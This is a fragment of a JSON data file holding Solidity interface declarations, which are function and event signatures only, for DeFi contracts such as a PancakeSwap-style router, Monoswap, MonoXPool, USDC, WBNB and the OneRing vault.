                        "content": "interface IPancakeRouter {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  receive() external payable;\n}\n",
                        "token_count": 1170,
                        "imported": true
                    },
                    {
                        "name": "GymSinglePool",
                        "content": "interface GymSinglePool {\n  function depositFromOtherContract(\n    uint256 _depositAmount,\n    uint8 _periodId,\n    bool isUnlocked,\n    address _from\n  ) external;\n\n  function withdraw(uint256 _depositId) external;\n}\n",
                        "token_count": 53,
                        "imported": true
                    },
                    {
                        "name": "GymToken",
                        "content": "interface GymToken {\n  function approve(address spender, uint256 rawAmount) external returns (bool);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n}\n",
                        "token_count": 56,
                        "imported": true
                    },
                    {
                        "name": "ILiquidityMigrationV2",
                        "content": "interface ILiquidityMigrationV2 {\n  event OwnershipTransferred(\n    address indexed previousOwner,\n    address indexed newOwner\n  );\n  event migration(uint256 LPspended, uint256 LPrecived);\n\n  fallback() external;\n\n  function lpAddress() external view returns (address);\n\n  function migrate(uint256 _lpTokens) external;\n\n  function owner() external view returns (address);\n\n  function renounceOwnership() external;\n\n  function router() external view returns (address);\n\n  function transferOwnership(address newOwner) external;\n\n  function v1Address() external view returns (address);\n\n  function v2Address() external view returns (address);\n\n  function withdraw() external;\n\n  function withdrawTokens() external;\n\n  receive() external payable;\n}\n",
                        "token_count": 152,
                        "imported": true
                    },
                    {
                        "name": "WBNB",
                        "content": "interface WBNB {\n  function deposit() external payable;\n\n  function withdraw(uint256 wad) external;\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function transfer(address recipient, uint256 amount) external returns (bool);\n}\n",
                        "token_count": 52,
                        "imported": true
                    },
                    {
                        "name": "IWBNB",
                        "content": "interface IWBNB {\n  function name() external view returns (string memory);\n\n  function approve(address guy, uint256 wad) external returns (bool);\n\n  function totalSupply() external view returns (uint256);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 wad\n  ) external returns (bool);\n\n  function withdraw(uint256 wad) external;\n\n  function decimals() external view returns (uint8);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function symbol() external view returns (string memory);\n\n  function transfer(address dst, uint256 wad) external returns (bool);\n\n  function deposit() external payable;\n\n  function allowance(address, address) external view returns (uint256);\n\n  fallback() external payable;\n\n  event Approval(address indexed src, address indexed guy, uint256 wad);\n  event Transfer(address indexed src, address indexed dst, uint256 wad);\n  event Deposit(address indexed dst, uint256 wad);\n  event Withdrawal(address indexed src, uint256 wad);\n}\n",
                        "token_count": 216,
                        "imported": true
                    },
                    {
                        "name": "Pool",
                        "content": "interface Pool {\n  event FeesUpdated(uint256 _mintingFee, uint256 _redemptionFee);\n  event MaxXftmSupplyUpdated(uint256 _value);\n  event MinCollateralRatioUpdated(uint256 _minCollateralRatio);\n  event Mint(\n    address minter,\n    uint256 amount,\n    uint256 ftmIn,\n    uint256 fantasmIn,\n    uint256 fee\n  );\n  event NewCollateralRatioOptions(\n    uint256 _ratioStepUp,\n    uint256 _ratioStepDown,\n    uint256 _priceBand,\n    uint256 _refreshCooldown\n  );\n  event NewCollateralRatioSet(uint256 _cr);\n  event OracleChanged(address indexed _oracle);\n  event OwnershipTransferred(\n    address indexed previousOwner,\n    address indexed newOwner\n  );\n  event PoolUtilsChanged(address indexed _addr);\n  event Recollateralized(address indexed _sender, uint256 _amount);\n  event Redeem(\n    address redeemer,\n    uint256 amount,\n    uint256 ftmOut,\n    uint256 fantasmOut,\n    uint256 fee\n  );\n  event SwapConfigUpdated(\n    address indexed _router,\n    uint256 _slippage,\n    address[] _paths\n  );\n  event Toggled(bool _mintPaused, bool _redeemPaused);\n  event UpdateCollateralRatioPaused(bool _collateralRatioPaused);\n  event ZapMint(address minter, uint256 amount, uint256 ftmIn, uint256 fee);\n\n  function MINTING_FEE_MAX() external view returns (uint256);\n\n  function REDEMPTION_FEE_MAX() external view returns (uint256);\n\n  function calcExcessFtmBalance()\n  external\n  view\n  returns (uint256 _delta, bool _exceeded);\n\n  function calcMint(uint256 _ftmIn, uint256 _fantasmIn)\n  external\n  view\n  returns (\n    uint256 _xftmOut,\n    uint256 _minFtmIn,\n    uint256 _minFantasmIn,\n    uint256 _fee\n  );\n\n  function calcRedeem(uint256 _xftmIn)\n  external\n  view\n  returns (\n    uint256 _ftmOut,\n    uint256 _fantasmOut,\n    uint256 _ftmFee,\n    uint256 _requiredFtmBalance\n  );\n\n  function calcZapMint(uint256 _ftmIn)\n  external\n  view\n  returns (\n    uint256 _xftmOut,\n    uint256 _fantasmOut,\n    uint256 _ftmFee,\n    uint256 _ftmSwapIn\n  );\n\n  function collateralRatio() external view returns (uint256);\n\n  function collateralRatioPaused() external view returns (bool);\n\n  function collect() external;\n\n  function configSwap(\n    address _swapRouter,\n    uint256 _swapSlippage,\n    address[] memory _swapPaths\n  ) external;\n\n  function fantasm() external view returns (address);\n\n  function feeReserve() external view returns (address);\n\n  function info()\n  external\n  view\n  returns (\n    uint256 _collateralRatio,\n    uint256 _lastRefreshCrTimestamp,\n    uint256 _mintingFee,\n    uint256 _redemptionFee,\n    bool _mintingPaused,\n    bool _redemptionPaused,\n    uint256 _collateralBalance,\n    uint256 _maxXftmSupply\n  );\n\n  function lastRefreshCrTimestamp() external view returns (uint256);\n\n  function maxXftmSupply() external view returns (uint256);\n\n  function minCollateralRatio() external view returns (uint256);\n\n  function mint(uint256 _fantasmIn, uint256 _minXftmOut) external payable;\n\n  function mintPaused() external view returns (bool);\n\n  function mintingFee() external view returns (uint256);\n\n  function oracle() external view returns (address);\n\n  function owner() external view returns (address);\n\n  function priceBand() external view returns (uint256);\n\n  function priceTarget() external view returns (uint256);\n\n  function ratioStepDown() external view returns (uint256);\n\n  function ratioStepUp() external view returns (uint256);\n\n  function recollateralize(uint256 _amount) external;\n\n  function recollateralizeETH() external payable;\n\n  function redeem(\n    uint256 _xftmIn,\n    uint256 _minFantasmOut,\n    uint256 _minFtmOut\n  ) external;\n\n  function redeemPaused() external view returns (bool);\n\n  function redemptionFee() external view returns (uint256);\n\n  function reduceExcessFtm(uint256 _amount) external;\n\n  function refreshCollateralRatio() external;\n\n  function refreshCooldown() external view returns (uint256);\n\n  function renounceOwnership() external;\n\n  function setCollateralRatioOptions(\n    uint256 _ratioStepUp,\n    uint256 _ratioStepDown,\n    uint256 _priceBand,\n    uint256 _refreshCooldown\n  ) external;\n\n  function setFeeReserve(address _feeReserve) external;\n\n  function setFees(uint256 _mintingFee, uint256 _redemptionFee) external;\n\n  function setMaxXftmSupply(uint256 _newValue) external;\n\n  function setMinCollateralRatio(uint256 _minCollateralRatio) external;\n\n  function setOracle(address _oracle) external;\n\n  function swapPaths(uint256) external view returns (address);\n\n  function swapRouter() external view returns (address);\n\n  function swapSlippage() external view returns (uint256);\n\n  function toggle(bool _mintPaused, bool _redeemPaused) external;\n\n  function toggleCollateralRatio(bool _collateralRatioPaused) external;\n\n  function transferOwnership(address newOwner) external;\n\n  function unclaimedFantasm() external view returns (uint256);\n\n  function unclaimedFtm() external view returns (uint256);\n\n  function unclaimedXftm() external view returns (uint256);\n\n  function usableFtmBalance() external view returns (uint256);\n\n  function userInfo(address)\n  external\n  view\n  returns (\n    uint256 xftmBalance,\n    uint256 fantasmBalance,\n    uint256 ftmBalance,\n    uint256 lastAction\n  );\n\n  function xftm() external view returns (address);\n\n  function zap(uint256 _minXftmOut) external payable;\n\n  receive() external payable;\n}\n",
                        "token_count": 1328,
                        "imported": true
                    },
                    {
                        "name": "Monoswap",
                        "content": "interface Monoswap {\n  event AddLiquidity(\n    address indexed provider,\n    uint256 indexed pid,\n    address indexed token,\n    uint256 liquidityAmount,\n    uint256 vcashAmount,\n    uint256 tokenAmount,\n    uint256 price\n  );\n  event OwnershipTransferred(\n    address indexed previousOwner,\n    address indexed newOwner\n  );\n  event PoolBalanced(address _token, uint256 vcashIn);\n  event PoolStatusChanged(address _token, uint8 oldStatus, uint8 newStatus);\n  event RemoveLiquidity(\n    address indexed provider,\n    uint256 indexed pid,\n    address indexed token,\n    uint256 liquidityAmount,\n    uint256 vcashAmount,\n    uint256 tokenAmount,\n    uint256 price\n  );\n  event Swap(\n    address indexed user,\n    address indexed tokenIn,\n    address indexed tokenOut,\n    uint256 amountIn,\n    uint256 amountOut,\n    uint256 swapVcashValue\n  );\n  event SyntheticPoolPriceChanged(address _token, uint256 price);\n\n  function _removeLiquidity(\n    address _token,\n    uint256 liquidity,\n    address to\n  )\n  external\n  view\n  returns (\n    uint256 poolValue,\n    uint256 liquidityIn,\n    uint256 vcashOut,\n    uint256 tokenOut\n  );\n\n  function addLiquidity(\n    address _token,\n    uint256 _amount,\n    address to\n  ) external returns (uint256 liquidity);\n\n  function addLiquidityETH(address to)\n  external\n  payable\n  returns (uint256 liquidity);\n\n  function addLiquidityPair(\n    address _token,\n    uint256 vcashAmount,\n    uint256 tokenAmount,\n    address to\n  ) external returns (uint256 liquidity);\n\n  function addSpecialToken(\n    address _token,\n    uint256 _price,\n    uint8 _status\n  ) external returns (uint256 _pid);\n\n  function getAmountIn(\n    address tokenIn,\n    address tokenOut,\n    uint256 amountOut\n  )\n  external\n  view\n  returns (\n    uint256 tokenInPrice,\n    uint256 tokenOutPrice,\n    uint256 amountIn,\n    uint256 tradeVcashValue\n  );\n\n  function getAmountOut(\n    address tokenIn,\n    address tokenOut,\n    uint256 amountIn\n  )\n  external\n  view\n  returns (\n    uint256 tokenInPrice,\n    uint256 tokenOutPrice,\n    uint256 amountOut,\n    uint256 tradeVcashValue\n  );\n\n  function getConfig()\n  external\n  view\n  returns (\n    address _vCash,\n    address _weth,\n    address _feeTo,\n    uint16 _fees,\n    uint16 _devFee\n  );\n\n  function getPool(address _token)\n  external\n  view\n  returns (\n    uint256 poolValue,\n    uint256 tokenBalanceVcashValue,\n    uint256 vcashCredit,\n    uint256 vcashDebt\n  );\n\n  function initialize(address _monoXPool, address _vcash) external;\n\n  function lastTradedBlock(address) external view returns (uint256);\n\n  function listNewToken(\n    address _token,\n    uint256 _price,\n    uint256 vcashAmount,\n    uint256 tokenAmount,\n    address to\n  ) external returns (uint256 _pid, uint256 liquidity);\n\n  function monoXPool() external view returns (address);\n\n  function owner() external view returns (address);\n\n  function poolSize() external view returns (uint256);\n\n  function poolSizeMinLimit() external view returns (uint256);\n\n  function pools(address)\n  external\n  view\n  returns (\n    uint256 pid,\n    uint256 lastPoolValue,\n    address token,\n    uint8 status,\n    uint112 vcashDebt,\n    uint112 vcashCredit,\n    uint112 tokenBalance,\n    uint256 price,\n    uint256 createdAt\n  );\n\n  function priceAdjusterRole(address) external view returns (bool);\n\n  function rebalancePool(address _token) external;\n\n  function removeLiquidity(\n    address _token,\n    uint256 liquidity,\n    address to,\n    uint256 minVcashOut,\n    uint256 minTokenOut\n  ) external returns (uint256 vcashOut, uint256 tokenOut);\n\n  function removeLiquidityETH(\n    uint256 liquidity,\n    address to,\n    uint256 minVcashOut,\n    uint256 minTokenOut\n  ) external returns (uint256 vcashOut, uint256 tokenOut);\n\n  function renounceOwnership() external;\n\n  function setDevFee(uint16 _devFee) external;\n\n  function setFeeTo(address _feeTo) external;\n\n  function setFees(uint16 _fees) external;\n\n  function setPoolSizeMinLimit(uint256 _poolSizeMinLimit) external;\n\n  function setSynthPoolPrice(address _token, uint256 price) external;\n\n  function setTokenInsurance(address _token, uint256 _insurance) external;\n\n  function setTokenStatus(address _token, uint8 _status) external;\n\n  function swapETHForExactToken(\n    address tokenOut,\n    uint256 amountInMax,\n    uint256 amountOut,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256 amountIn);\n\n  function swapExactETHForToken(\n    address tokenOut,\n    uint256 amountOutMin,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256 amountOut);\n\n  function swapExactTokenForETH(\n    address tokenIn,\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountOut);\n\n  function swapExactTokenForToken(\n    address tokenIn,\n    address tokenOut,\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountOut);\n\n  function swapTokenForExactETH(\n    address tokenIn,\n    uint256 amountInMax,\n    uint256 amountOut,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountIn);\n\n  function swapTokenForExactToken(\n    address tokenIn,\n    address tokenOut,\n    uint256 amountInMax,\n    uint256 amountOut,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountIn);\n\n  function tokenInsurance(address) external view returns (uint256);\n\n  function tokenPoolStatus(address) external view returns (uint8);\n\n  function transferOwnership(address newOwner) external;\n\n  function updatePoolPrice(address _token, uint256 _newPrice) external;\n\n  function updatePoolStatus(address _token, uint8 _status) external;\n\n  function updatePriceAdjuster(address account, bool _status) external;\n}\n",
                        "token_count": 1416,
                        "imported": true
                    },
                    {
                        "name": "IDMMExchangeRouter",
                        "content": "interface IDMMExchangeRouter {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata poolsPath,\n        IERC20[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapTokensForExactTokens(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] calldata poolsPath,\n        IERC20[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapExactETHForTokens(\n        uint256 amountOutMin,\n        address[] calldata poolsPath,\n        IERC20[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable returns (uint256[] memory amounts);\n\n    function swapTokensForExactETH(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] calldata poolsPath,\n        IERC20[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapExactTokensForETH(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata poolsPath,\n        IERC20[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapETHForExactTokens(\n        uint256 amountOut,\n        address[] calldata poolsPath,\n        IERC20[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable returns (uint256[] memory amounts);\n\n    function getAmountsOut(\n        uint256 amountIn,\n        address[] calldata poolsPath,\n        IERC20[] calldata path\n    ) external view returns (uint256[] memory amounts);\n\n    function getAmountsIn(\n        uint256 amountOut,\n        address[] calldata poolsPath,\n        IERC20[] calldata path\n    ) external view returns (uint256[] memory amounts);\n}\n",
                        "token_count": 428,
                        "imported": true
                    },
                    {
                        "name": "MonoXPool",
                        "content": "interface MonoXPool {\n  event ApprovalForAll(\n    address indexed account,\n    address indexed operator,\n    bool approved\n  );\n  event OwnershipTransferred(\n    address indexed previousOwner,\n    address indexed newOwner\n  );\n  event TransferBatch(\n    address indexed operator,\n    address indexed from,\n    address indexed to,\n    uint256[] ids,\n    uint256[] values\n  );\n  event TransferSingle(\n    address indexed operator,\n    address indexed from,\n    address indexed to,\n    uint256 id,\n    uint256 value\n  );\n  event URI(string value, uint256 indexed id);\n\n  function WETH() external view returns (address);\n\n  function admin() external view returns (address);\n\n  function balanceOf(address account, uint256 id)\n  external\n  view\n  returns (uint256);\n\n  function balanceOfBatch(address[] memory accounts, uint256[] memory ids)\n  external\n  view\n  returns (uint256[] memory);\n\n  function burn(\n    address account,\n    uint256 id,\n    uint256 amount\n  ) external;\n\n  function createdAt(uint256) external view returns (uint256);\n\n  function depositWETH(uint256 amount) external;\n\n  function initialize(address _WETH) external;\n\n  function isApprovedForAll(address account, address operator)\n  external\n  view\n  returns (bool);\n\n  function isUnofficial(uint256) external view returns (bool);\n\n  function liquidityLastAddedOf(uint256 pid, address account)\n  external\n  view\n  returns (uint256);\n\n  function mint(\n    address account,\n    uint256 id,\n    uint256 amount\n  ) external;\n\n  function mintLp(\n    address account,\n    uint256 id,\n    uint256 amount,\n    bool _isUnofficial\n  ) external;\n\n  function owner() external view returns (address);\n\n  function renounceOwnership() external;\n\n  function safeBatchTransferFrom(\n    address from,\n    address to,\n    uint256[] memory ids,\n    uint256[] memory amounts,\n    bytes memory data\n  ) external;\n\n  function safeTransferERC20Token(\n    address token,\n    address to,\n    uint256 amount\n  ) external;\n\n  function safeTransferETH(address to, uint256 amount) external;\n\n  function safeTransferFrom(\n    address from,\n    address to,\n    uint256 id,\n    uint256 amount,\n    bytes memory data\n  ) external;\n\n  function setAdmin(address _admin) external;\n\n  function setApprovalForAll(address operator, bool approved) external;\n\n  function setURI(string memory uri) external;\n\n  function setWhitelist(address _whitelist, bool _isWhitelist) external;\n\n  function supportsInterface(bytes4 interfaceId) external view returns (bool);\n\n  function topHolder(uint256) external view returns (address);\n\n  function topLPHolderOf(uint256 pid) external view returns (address);\n\n  function totalSupply(uint256) external view returns (uint256);\n\n  function totalSupplyOf(uint256 pid) external view returns (uint256);\n\n  function transferOwnership(address newOwner) external;\n\n  function uri(uint256) external view returns (string memory);\n\n  function withdrawWETH(uint256 amount) external;\n}\n",
                        "token_count": 658,
                        "imported": true
                    },
                    {
                        "name": "USDC",
                        "content": "interface USDC {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event AuthorizationCanceled(\n    address indexed authorizer,\n    bytes32 indexed nonce\n  );\n  event AuthorizationUsed(address indexed authorizer, bytes32 indexed nonce);\n  event Blacklisted(address indexed _account);\n  event BlacklisterChanged(address indexed newBlacklister);\n  event Burn(address indexed burner, uint256 amount);\n  event MasterMinterChanged(address indexed newMasterMinter);\n  event Mint(address indexed minter, address indexed to, uint256 amount);\n  event MinterConfigured(address indexed minter, uint256 minterAllowedAmount);\n  event MinterRemoved(address indexed oldMinter);\n  event OwnershipTransferred(address previousOwner, address newOwner);\n  event Pause();\n  event PauserChanged(address indexed newAddress);\n  event RescuerChanged(address indexed newRescuer);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  event UnBlacklisted(address indexed _account);\n  event Unpause();\n\n  function CANCEL_AUTHORIZATION_TYPEHASH() external view returns (bytes32);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function RECEIVE_WITH_AUTHORIZATION_TYPEHASH()\n  external\n  view\n  returns (bytes32);\n\n  function TRANSFER_WITH_AUTHORIZATION_TYPEHASH()\n  external\n  view\n  returns (bytes32);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function authorizationState(address authorizer, bytes32 nonce)\n  external\n  view\n  returns (bool);\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function blacklist(address _account) external;\n\n  function blacklister() external view returns (address);\n\n  function burn(uint256 _amount) external;\n\n  function cancelAuthorization(\n    address authorizer,\n    bytes32 nonce,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function configureMinter(address minter, uint256 minterAllowedAmount)\n  external\n  returns (bool);\n\n  function currency() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function decreaseAllowance(address spender, uint256 decrement)\n  external\n  returns (bool);\n\n  function increaseAllowance(address spender, uint256 increment)\n  external\n  returns (bool);\n\n  function initialize(\n    string memory tokenName,\n    string memory tokenSymbol,\n    string memory tokenCurrency,\n    uint8 tokenDecimals,\n    address newMasterMinter,\n    address newPauser,\n    address newBlacklister,\n    address newOwner\n  ) external;\n\n  function initializeV2(string memory newName) external;\n\n  function initializeV2_1(address lostAndFound) external;\n\n  function isBlacklisted(address _account) external view returns (bool);\n\n  function isMinter(address account) external view returns (bool);\n\n  function masterMinter() external view returns (address);\n\n  function mint(address _to, uint256 _amount) external returns (bool);\n\n  function minterAllowance(address minter) external view returns (uint256);\n\n  function name() external view returns (string memory);\n\n  function nonces(address owner) external view returns (uint256);\n\n  function owner() external view returns (address);\n\n  function pause() external;\n\n  function paused() external view returns (bool);\n\n  function pauser() external view returns (address);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function receiveWithAuthorization(\n    address from,\n    address to,\n    uint256 value,\n    uint256 validAfter,\n    uint256 validBefore,\n    bytes32 nonce,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function removeMinter(address minter) external returns (bool);\n\n  function rescueERC20(\n    address tokenContract,\n    address to,\n    uint256 amount\n  ) external;\n\n  function rescuer() external view returns (address);\n\n  function symbol() external view returns (string memory);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n\n  function transferOwnership(address newOwner) external;\n\n  function transferWithAuthorization(\n    address from,\n    address to,\n    uint256 value,\n    uint256 validAfter,\n    uint256 validBefore,\n    bytes32 nonce,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function unBlacklist(address _account) external;\n\n  function unpause() external;\n\n  function updateBlacklister(address _newBlacklister) external;\n\n  function updateMasterMinter(address _newMasterMinter) external;\n\n  function updatePauser(address _newPauser) external;\n\n  function updateRescuer(address newRescuer) external;\n\n  function version() external view returns (string memory);\n}\n",
                        "token_count": 1102,
                        "imported": true
                    },
                    {
                        "name": "MonoToken",
                        "content": "interface MonoToken {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event DelegateChanged(\n    address indexed delegator,\n    address indexed fromDelegate,\n    address indexed toDelegate\n  );\n  event DelegateVotesChanged(\n    address indexed delegate,\n    uint256 previousBalance,\n    uint256 newBalance\n  );\n  event OwnershipTransferred(\n    address indexed previousOwner,\n    address indexed newOwner\n  );\n  event RoleAdminChanged(\n    bytes32 indexed role,\n    bytes32 indexed previousAdminRole,\n    bytes32 indexed newAdminRole\n  );\n  event RoleGranted(\n    bytes32 indexed role,\n    address indexed account,\n    address indexed sender\n  );\n  event RoleRevoked(\n    bytes32 indexed role,\n    address indexed account,\n    address indexed sender\n  );\n  event Snapshot(uint256 id);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DEFAULT_ADMIN_ROLE() external view returns (bytes32);\n\n  function DELEGATION_TYPEHASH() external view returns (bytes32);\n\n  function DOMAIN_TYPEHASH() external view returns (bytes32);\n\n  function MINTER_ROLE() external view returns (bytes32);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function balanceOfAt(address account, uint256 snapshotId)\n  external\n  view\n  returns (uint256);\n\n  function cap() external view returns (uint256);\n\n  function checkpoints(address, uint32)\n  external\n  view\n  returns (uint32 fromBlock, uint256 votes);\n\n  function childChainManagerProxy() external view returns (address);\n\n  function decimals() external view returns (uint8);\n\n  function decreaseAllowance(address spender, uint256 subtractedValue)\n  external\n  returns (bool);\n\n  function delegate(address delegatee) external;\n\n  function delegateBySig(\n    address delegatee,\n    uint256 nonce,\n    uint256 expiry,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function delegates(address delegator) external view returns (address);\n\n  function deposit(address user, bytes memory depositData) external;\n\n  function getCurrentVotes(address account) external view returns (uint256);\n\n  function getPriorVotes(address account, uint256 blockNumber)\n  external\n  view\n  returns (uint256);\n\n  function getRoleAdmin(bytes32 role) external view returns (bytes32);\n\n  function getRoleMember(bytes32 role, uint256 index)\n  external\n  view\n  returns (address);\n\n  function getRoleMemberCount(bytes32 role) external view returns (uint256);\n\n  function grantRole(bytes32 role, address account) external;\n\n  function hasRole(bytes32 role, address account) external view returns (bool);\n\n  function increaseAllowance(address spender, uint256 addedValue)\n  external\n  returns (bool);\n\n  function mint(address _to, uint256 _amount) external;\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function numCheckpoints(address) external view returns (uint32);\n\n  function owner() external view returns (address);\n\n  function renounceOwnership() external;\n\n  function renounceRole(bytes32 role, address account) external;\n\n  function revokeRole(bytes32 role, address account) external;\n\n  function setMinter(address _minter) external;\n\n  function snapshot() external returns (uint256 currentId);\n\n  function symbol() external view returns (string memory);\n\n  function totalSupply() external view returns (uint256);\n\n  function totalSupplyAt(uint256 snapshotId) external view returns (uint256);\n\n  function transfer(address recipient, uint256 amount) external returns (bool);\n\n  function transferFrom(\n    address sender,\n    address recipient,\n    uint256 amount\n  ) external returns (bool);\n\n  function transferOwnership(address newOwner) external;\n\n  function updateChildChainManager(address newChildChainManagerProxy) external;\n\n  function withdraw(uint256 amount) external;\n}\n",
                        "token_count": 858,
                        "imported": true
                    },
                    {
                        "name": "IOneRingVault",
                        "content": "interface IOneRingVault {\n  function depositSafe(\n    uint256 _amount,\n    address _token,\n    uint256 _minAmount\n  ) external;\n\n  function withdraw(uint256 _amount, address _underlying) external;\n\n  function balanceOf(address account) external view returns (uint256);\n}\n",
                        "token_count": 63,
                        "imported": true
                    },
                    {
                        "name": "ICEtherDelegate",
                        "content": "interface ICEtherDelegate {\n  function borrow(uint256 borrowAmount) external returns (uint256);\n\n  function getCash() external view returns (uint256);\n\n  function mint() external payable;\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function transfer(address dst, uint256 amount) external returns (bool);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 amount\n  ) external returns (bool);\n\n  function underlying() external view returns (address);\n}\n",
                        "token_count": 103,
                        "imported": true
